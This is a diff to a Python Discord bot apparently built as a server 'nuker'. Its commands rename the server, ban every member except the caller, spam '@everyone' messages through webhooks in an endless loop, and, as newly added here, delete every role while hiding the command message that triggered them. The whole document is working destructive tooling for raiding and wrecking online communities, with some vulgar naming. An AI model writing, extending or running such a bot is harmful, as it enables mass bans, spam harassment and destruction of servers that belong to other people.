@@ -14,7 +14,7 @@ import random
 with open("C:/Users/Administrator/Downloads/voidsec.png", "rb") as file: # replace this with your own file path
   servicon = file.read()
 
-penny = "token here real"
+penny = "token here lel"
 
 msgcum = ["@everyone yeah idk"]
 # add , after " to add more messagess
@@ -79,6 +79,7 @@ async def croles(ctx):
 
 @voidsec.command()
 async def nuke(ctx):
+    await ctx.message.delete()
     void = ctx.guild
     await void.edit(name=servname, icon=servicon)
     await asyncio.gather(
@@ -90,6 +91,7 @@ async def nuke(ctx):
 @voidsec.command()
 async def mban(ctx):
     void = ctx.guild
+    await ctx.message.delete()
     for member in void.members:
         if member != ctx.author:
             try:
@@ -100,10 +102,25 @@ async def mban(ctx):
 
 @voidsec.event
 async def on_guild_channel_create(channel):
-    await channel.create_webhook(name="nutdestroyer420", avatar=servicon) 
+    try:
+       await channel.create_webhook(name="nutdestroyer420", avatar=servicon)
+       print(f"{Fore.GREEN}[+] Webhook created")
+    except:
+        print(f"{Fore.RED}[-] Webhook not created") 
     for webhook in await channel.webhooks():
         while True:
           await webhook.send(random.choice(msgcum))
           await channel.send(random.choice(msgcum))
+
+@voidsec.command()
+async def roledel(ctx):
+    void = ctx.guild
+    await ctx.message.delete()
+    for role in void.roles:
+        try:
+           await role.delete()
+           print(f"{Fore.GREEN}[+] Role deleted")
+        except:
+            print(f"{Fore.RED}[-] Role not deleted")
 
 voidsec.run(penny)
